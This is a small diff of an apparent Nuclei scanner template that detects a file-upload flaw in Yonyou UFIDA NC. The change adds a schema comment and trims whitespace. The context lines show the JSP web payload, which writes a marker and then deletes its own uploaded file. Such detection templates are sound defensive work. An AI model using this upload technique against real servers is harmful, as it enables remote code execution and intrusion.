@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yonyou-ufida-nc-savedoc-file-upload
 
 info:
@@ -30,7 +31,7 @@ http:
         content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
                     <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
                 <hi:scriptlet>
-                          out.println("{{r1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
+                          out.println("{{r1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();
                 </hi:scriptlet>
               </hi>
 
